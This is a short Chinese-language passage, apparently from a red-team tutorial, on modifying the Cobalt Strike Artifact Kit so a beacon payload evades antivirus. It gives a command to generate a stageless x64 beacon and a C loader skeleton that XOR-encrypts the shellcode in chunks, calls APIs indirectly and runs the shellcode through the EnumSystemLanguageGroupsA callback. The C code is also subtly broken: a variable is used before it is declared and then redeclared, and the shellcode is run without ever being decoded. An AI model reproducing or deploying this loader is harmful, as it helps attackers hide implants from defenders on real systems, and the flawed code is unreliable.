```bash
# 1. 生成 payload（在 CS 客户端）
#    Attack -> Packages -> Windows Executable (S) -> 选 x64 / Stageless -> 存成 beacon.bin
# 2. 确认 shellcode 结构
xxd -l 32 beacon.bin
```

核心做法是把 shellcode 从"明文串 + VirtualAlloc/RWX + CreateThread"改成"分片加密 + 系统 API 反射调用 + 回调式执行"，落到 `artifact.c` 的 `go()` 里：

```c
// artifact.c  ——  CS Artifact Kit 改造骨架
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$EnumSystemLanguageGroupsA(LANGUAGEGROUP_ENUMPROCA, DWORD, LONG_PTR);
DECLSPEC_IMPORT void   WINAPI KERNEL32$Sleep(DWORD);

// 1) 分片 + 异或，运行时拼回
static unsigned char k[] = { 0x11,0x22,0x33,0x44 };   // 换成随机 key
static const unsigned int chunk = 0x1000;

static void decode(unsigned char* p, unsigned int n) {
    for (unsigned int i = 0; i < n; i++) p[i] ^= k[i % sizeof(k)];
}

// 2) 回调式执行：EnumSystemLanguageGroupsA 作为执行触发点
static BOOL CALLBACK cb(LPVOID lp, DWORD dw, LONG_PTR lpP) {
    unsigned char* p = (unsigned char*)lpP;
    decode(p, *(unsigned int*)lp);
    return FALSE;
}

void go(char* args, int len) {
    unsigned int slen = sizeof(sc);          // sc 由 kit 的 arcy 生成，见下
    unsigned char* sc = KERNEL32$VirtualAlloc(NULL, slen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    for (unsigned int i = 0; i < slen; i += chunk) {
        unsigned int n = (slen - i > chunk) ? chunk : (slen - i);
        for (unsigned int j = 0; j < n; j++) sc[i+j] = sc_raw[i+j];   // 从资源段取
    }
    DWORD old;
    KERNEL32$VirtualProtect(sc, slen, PAGE_EXECUTE_READ, &old);
    KERNEL32$EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)cb, LGRPID_INSTALLED, (LONG_PTR)sc);
}
```

